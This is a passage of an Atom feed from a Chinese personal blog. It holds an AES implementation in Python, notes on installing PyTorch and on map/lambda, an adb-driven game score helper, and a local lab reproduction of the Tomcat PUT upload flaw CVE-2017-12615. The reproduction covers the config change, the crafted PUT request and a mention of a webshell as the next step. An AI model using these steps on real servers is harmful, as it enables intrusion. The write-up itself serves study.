class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,</div><div class="line">        <span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,</div><div class="line">        <span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,</div><div class="line">        <span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,</div><div class="line">        <span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,</div><div class="line">        <span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span>]</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        out[j] = Map[k3[j]]</div><div class="line">    <span class="keyword">return</span> out</div><div class="line"></div><div class="line"><span class="comment">#根据rocn常量表查表</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rcons45</span><span class="params">(k3,n)</span>:</span></div><div class="line">    Rcon = [<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x04</span>,<span class="number">0x08</span>,<span class="number">0x10</span>,<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="number">0x80</span>,<span class="number">0x1b</span>,<span class="number">0x36</span>]</div><div class="line">    k3[<span class="number">0</span>] = Rcon[n]^k3[<span class="number">0</span>]</div><div class="line">    <span class="keyword">return</span> k3</div><div class="line"></div><div class="line"><span class="comment">#异或</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Mod45</span><span class="params">(Input,k3)</span>:</span></div><div class="line">    out = [[<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        out[i][<span class="number">0</span>] = Input[i][<span class="number">0</span>]^k3[i]</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>):</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            out[i][j+<span class="number">1</span>] = Input[i][j+<span class="number">1</span>]^out[i][j]</div><div class="line">    <span class="keyword">return</span> out</div></pre></td></tr></table></figure><h3 id="3-4-测试用例-py"><a href="#3-4-测试用例-py" class="headerlink" title="3.4 测试用例.py"></a>3.4 测试用例.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> encode</div><div class="line"><span class="keyword">import</span> decode</div><div class="line"></div><div class="line"><span class="comment">#随机生成明文加密并保存（一次）</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">TestFun</span><span class="params">()</span>:</span></div><div class="line">    input1 = [[<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            input1[i][j] = random.randint(<span class="number">0</span>,<span class="number">255</span>)</div><div class="line">    out = encode.encode(input1)</div><div class="line">    a = PrintOut(input1)</div><div class="line">    b = PrintOut(out)</div><div class="line">    print(<span class="string">'明文为：'</span>+PrintOut(input1))</div><div class="line">    print(<span class="string">'密文为：'</span>+PrintOut(out))</div><div class="line">    print(<span class="string">'--------------------------------------------------------------------------------------'</span>)</div><div class="line">    file = open(<span class="string">'test.txt'</span>,<span class="string">'a'</span>)</div><div class="line">    file.write(<span class="string">'明文为：%s \t 密文为：%s\n'</span>%(a,b))</div><div class="line"></div><div class="line"><span class="comment">#规范输出格式（列表--&gt;字符串）</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">PrintOut</span><span class="params">(Input)</span>:</span></div><div class="line">    temp = []</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            a = hex(Input[i][j])[<span class="number">2</span>:]</div><div class="line">            <span class="keyword">if</span> len(a)&lt;<span class="number">2</span>:</div><div class="line">                a = <span class="string">'0'</span>+a</div><div class="line">            temp.append(a)</div><div class="line">    out = <span class="string">''</span>.join(map(str,temp))</div><div class="line">    <span class="keyword">return</span> out</div><div class="line"></div><div class="line"><span class="comment">#生成明文并加密功能</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeFun</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'How much times do you want to do?'</span>)</div><div class="line">    n = int(input())</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">        TestFun()</div><div class="line"></div><div class="line"><span class="comment">#读取密文并解密功能</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decodeFun</span><span class="params">()</span>:</span></div><div class="line">    a = decode.ReadFile()</div><div class="line">    print(a)</div></pre></td></tr></table></figure><h3 id="3-5-GUI测试-（主程序）-py"><a href="#3-5-GUI测试-（主程序）-py" class="headerlink" title="3.5 GUI测试~（主程序）.py:"></a>3.5 GUI测试~（主程序）.py:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> easygui <span class="keyword">as</span> g</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> 测试用例</div><div class="line"><span class="keyword">import</span> decode</div><div class="line"></div><div class="line"></div><div class="line">g.msgbox(<span class="string">"这是一个AES加解密程序！"</span>,title = <span class="string">"AES加解密"</span>)</div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line"></div><div class="line">        msg =<span class="string">"请问你想要完成怎样的功能？"</span></div><div class="line">        title = <span class="string">"AES加解密"</span></div><div class="line">        choices = [<span class="string">"加密（随机生成明文）"</span>, <span class="string">"解密（读取文档）"</span>, <span class="string">"查看文档内容"</span>, <span class="string">"标准测试（可自定义）"</span>, <span class="string">"退出程序~"</span>]</div><div class="line"></div><div class="line">        choice = g.choicebox(msg, title, choices)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> choice == <span class="keyword">None</span>:                    <span class="comment">#关掉选择窗口或者cancel时退出</span></div><div class="line">            sys.exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> choice == <span class="string">"加密（随机生成明文）"</span>:</div><div class="line">                num = g.integerbox(<span class="string">"请输入想要生成的明文个数："</span>,title = choice,lowerbound = <span class="number">1</span>,upperbound = <span class="number">10</span>)</div><div class="line">                <span class="keyword">if</span> num == <span class="keyword">None</span>:</div><div class="line">                        sys.exit(<span class="number">0</span>)</div><div class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(int(num)):</div><div class="line">                        测试用例.TestFun()</div><div class="line">                print(<span class="string">"加密完毕"</span>)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> choice == <span class="string">"查看文档内容"</span>:</div><div class="line">                file = open(<span class="string">'test.txt'</span>,<span class="string">'r'</span>)</div><div class="line">                text = file.readlines()</div><div class="line">                g.textbox(msg = <span class="string">"当前文档内容为"</span>,title = choice ,text = text)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> choice == <span class="string">"解密（读取文档）"</span>:</div><div class="line">                print(<span class="string">"开始读取文档..."</span>)</div><div class="line">                a = decode.ReadFile()</div><div class="line">                print(a)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> choice == <span class="string">"退出程序~"</span>:</div><div class="line">                sys.exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> choice == <span class="string">"标准测试（可自定义）"</span>:</div><div class="line">                fieldNames = [<span class="string">"密文"</span>,<span class="string">"密钥"</span>]</div><div class="line">                fieldValues = [<span class="string">"3925841d02dc09fbdc118597196a0b32"</span>,<span class="string">"2b7e151628aed2a6abf7158809cf4f3c"</span>]</div><div class="line">                <span class="comment">#3243f6a8885a308d313198a2e0370734</span></div><div class="line">                fieldValues = g.multenterbox( <span class="string">"加密测试（默认值为标准fips-197，可修改）"</span>, <span class="string">"加密测试"</span>,fieldNames,fieldValues)</div><div class="line">                Input = decode.Trans(fieldValues[<span class="number">0</span>])</div><div class="line">                Key = decode.Trans(fieldValues[<span class="number">1</span>])</div><div class="line">                decode.decodeWithKey(Input,Key)</div><div class="line"></div><div class="line">        msg = <span class="string">"需要返回功能选择页面吗？"</span></div><div class="line">        title = <span class="string">"返回or退出"</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> g.ccbox(msg, title):</div><div class="line">                <span class="keyword">pass</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">                sys.exit(<span class="number">0</span>)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;AES加密&quot;&gt;&lt;a href=&quot;#AES加密&quot; class=&quot;headerlink&quot; title=&quot;AES加密&quot;&gt;&lt;/a&gt;&lt;strong&gt;AES加密&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;1、AES加密原理简单介绍&quot;&gt;&lt;a href=&quot;#1、AES加密原理简单
      
    
    </summary>
    
    
      <category term="python 密码学" scheme="http://Yuririns.github.io/tags/python-%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>pytorch安装</title>
    <link href="http://Yuririns.github.io/2018/08/07/pytorch%E5%AE%89%E8%A3%85/"/>
    <id>http://Yuririns.github.io/2018/08/07/pytorch安装/</id>
    <published>2018-08-07T06:44:54.000Z</published>
    <updated>2018-08-07T07:29:29.546Z</updated>
    
    <content type="html"><![CDATA[<p>环境为win8.1+python3.6.2<br>这里选择通过Python3.6+pip安装gpu版本pytorch</p><p>首先要先安装cuda：<a href="https://developer.nvidia.com/cuda-downloadstarget_os=Windows&amp;target_arch=x86_64" target="_blank" rel="external">cuda下载地址</a></p><p>根据自己的系统选择相对应的版本：<br><img src="/pic/pytorch安装/1.png" alt="image"></p><p>下载cuDNN库：<a href="https://developer.nvidia.com/cudnn" target="_blank" rel="external">cuDNN库下载地址</a><br>需要注册并且填写一个问卷<br><img src="/pic/pytorch安装/2.png" alt="image"><br>然鹅！！！<br>好不容易填写完问卷之后，我发现cuDNN下载只提供了win7和win10的_(:3J∠)_<br><img src="/pic/pytorch安装/3.png" alt="image"><br>然后win8的我放弃了这一步</p><p>安装完毕后测试安装结果<br>打开命令提示符，输入：nvcc -V<br>结果如下：<br><img src="/pic/pytorch安装/4.png" alt="image"></p><p>接下来安装pytorch：<br>下载：<a href="https://pan.baidu.com/s/1dF6ayLr#list/path=%2Fpytorch" target="_blank" rel="external">pytorch</a><br>由于我的环境为：win8.1+python3.6.2+cuda8.0<br>所以选择下载：<br><img src="/pic/pytorch安装/5.png" alt="image"><br>这里可供选择的两个whl文件都是要求64位Python的，由于我之前安装的Python3.6是32位的还卸载了重新安装了64位_(:3J∠)_</p><p>下载后通过pip安装whl文件<br>安装完成后测试：<br><img src="/pic/pytorch安装/6.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;环境为win8.1+python3.6.2&lt;br&gt;这里选择通过Python3.6+pip安装gpu版本pytorch&lt;/p&gt;
&lt;p&gt;首先要先安装cuda：&lt;a href=&quot;https://developer.nvidia.com/cuda-downloadstarget_o
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>map函数和lambda函数</title>
    <link href="http://Yuririns.github.io/2018/08/03/map%E5%87%BD%E6%95%B0/"/>
    <id>http://Yuririns.github.io/2018/08/03/map函数/</id>
    <published>2018-08-03T05:36:51.000Z</published>
    <updated>2018-08-03T07:38:56.637Z</updated>
    
    <content type="html"><![CDATA[<p>在之前写AES加密算法的代码时，发现map函数在2.x版本和3.x版本中用法有点不同：</p><blockquote><p>Python 2.x 返回列表。<br>Python 3.x 返回迭代器。</p></blockquote><p>在3.x的版本中mao()函数返回的是迭代器，所以需要使用list()函数使其返回正常列表：<br><img src="/pic/map函数/1.png" alt="image"></p><p>以及在2.x版本中可以使用下面①的方法实现输出<br>[(1*2),(3*2),(2*3),(4*8)]:<br><img src="/pic/map函数/2.png" alt="image"><br>而在3.x版本中无法识别 lambda(a,b) 所以使用②的方法：lambda x: x[0]*x[1]</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在之前写AES加密算法的代码时，发现map函数在2.x版本和3.x版本中用法有点不同：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Python 2.x 返回列表。&lt;br&gt;Python 3.x 返回迭代器。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在3.x的版本中mao()函
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>跳一跳学adb</title>
    <link href="http://Yuririns.github.io/2018/02/25/%E8%B7%B3%E4%B8%80%E8%B7%B3java%E5%8D%8A%E8%87%AA%E5%8A%A8%E5%88%B7%E5%88%86/"/>
    <id>http://Yuririns.github.io/2018/02/25/跳一跳java半自动刷分/</id>
    <published>2018-02-25T02:58:51.000Z</published>
    <updated>2018-02-25T04:09:21.064Z</updated>
    
    <content type="html"><![CDATA[<p>之前看到一个大佬写的java的跳一跳半自动刷分代码，然后大概研究了一下<br>代码：<a href="https://github.com/fourbrother/WXJumpGameUtils" target="_blank" rel="external">click me</a></p><p>原理主要是用到了两个adb命令：</p><blockquote><p>adb shell screencap 截屏操作<br>adb shell input text 模拟滑动事件</p></blockquote><p>先在电脑上配置号android的adb环境变量<br>配置好了之后手机连上数据线，选择USB调试模式，测试一下通过adb命令截图</p><p><code>adb shell /system/bin/screencap -p /sdcard/1/screenshot.png（将截图保存到SDCard下文件夹1里）</code><br><code>adb pull /sdcard/screenshot.png e:/1/screenshot.png（将手机里的截图保存到电脑e盘下文件夹1里）</code><br><img src="/pic/2_1.png" alt="image"><br>可以看到E盘下多了一个图片文件<br><img src="/pic/2_2.png" alt="image"></p><p>而另一个adb命令是：<br><code>adb shell input touchscreen swipe x1 y1 x2 y2 time</code><br>这个命令是在模拟滑动事件，从（x1,y1）经历time（时间）滑动到（x2,y2）</p><p><code>adb shell input touchscreen swipe 170 180 200 200 300（从（170,180）经历200毫秒滑动到（200,200））</code></p><p>而当（x1,y1）和（x2,y2）相同的特殊情况可以达到模拟长按的效果</p><p><code>adb shell input touchscreen swipe 170 180 170 180 3000（长按3000毫秒）</code></p><p>在运行大佬的java代码时，我发现在eclipse中运行代码中的adb命令没有效果，测试截图也没有截图（cmd命令窗口下能正常使用adb命令）<br>后来查了一下发现要把adb的exe程序和两个动态链接库dll拷贝到C盘两个目录下<br>将下面图片上选中的三个文件<br><img src="/pic/2_4.png" alt="image"><br>拷贝到：<br>C:\Windows\System32<br>C:\Windows\SysWOW64<br>这两个文件夹中<br>然后就能成功运行啦~<br><img src="/pic/2_3.png" alt="image"></p><p>在中途切出去想切首歌也被截到了2333<br><img src="/pic/2_3.jpg" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前看到一个大佬写的java的跳一跳半自动刷分代码，然后大概研究了一下&lt;br&gt;代码：&lt;a href=&quot;https://github.com/fourbrother/WXJumpGameUtils&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;click m
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2017-12615漏洞复现</title>
    <link href="http://Yuririns.github.io/2018/02/23/CVE-2017-12615%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://Yuririns.github.io/2018/02/23/CVE-2017-12615漏洞复现/</id>
    <published>2018-02-23T09:04:35.000Z</published>
    <updated>2019-04-22T15:20:29.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2017-12615漏洞复现"><a href="#CVE-2017-12615漏洞复现" class="headerlink" title="CVE-2017-12615漏洞复现"></a>CVE-2017-12615漏洞复现</h1><hr><h3 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1.漏洞背景"></a>1.漏洞背景</h3><p>Tomcat如果开启PUT方法支持则可能存在远程代码执行漏洞，漏洞编号为CVE-2017-12615的漏洞。攻击者可以在使用漏洞上传JSP文件，从而导致远程代码执行。此漏洞影响Windows平台下的Apache Tomcat 7.x版本，目前已经在Apache Tomcat 7.0.81中修复。</p><h3 id="2-环境配置和相关说明"><a href="#2-环境配置和相关说明" class="headerlink" title="2.环境配置和相关说明"></a>2.环境配置和相关说明</h3><ul><li>Windows 7</li><li>配置jdk环境</li><li>Tomcat ，版本为7.0.55</li><li>burpsuite</li></ul><p>安装tomcat，这里安装的版本为7.0.55<br><img src="/pic/1_1.png" alt="image"><br>修改Tomcat的conf下的web.xml配置文件<br>添加readonly设置为false时的情况(添加以下代码)</p><p><code>&lt;init-param&gt;</code><br><code>&lt;param-name&gt;readonly&lt;/param-name&gt;</code><br><code>&lt;param-value&gt;false&lt;/param-value&gt;</code><br><code>&lt;/init-param&gt;</code></p><p>打开burpsuite进行抓包，在抓包前修改burp代理的默认端口，设置为8008<br>同样地，在浏览器的代理处也设置为127.0.0.1:8008<br><img src="/pic/1_2.png" alt="image"><br>开启代理后刷新web页面进行抓包<br><img src="/pic/1_3.png" alt="image"><br>将GET / HTTP/1.1改成 PUT /1.jsp/ HTTP/1.1<br><img src="/pic/1_4.png" alt="image"><br>然后点击forward<br>浏览器回显是201，说明写入成功<br>来到webapps/ROOT目录下可以看到确实写入成功<br><img src="/pic/1_5.png" alt="image"><br>文件上传成功<br>当时是室友工程实践出问题了，我帮她找问题的时候把这个漏洞复现了一遍，完成的比较简单_(:3J∠)_<br>最后应该还要传一句话木马然后连菜刀的_(:3J∠)_</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2017-12615漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2017-12615漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2017-12615漏洞复现&quot;&gt;&lt;/a&gt;CVE-2017-12615漏洞复现&lt;/h1&gt;&lt;hr&gt;
&lt;h3 
      
    
    </summary>
    
    
  </entry>
  
</feed>
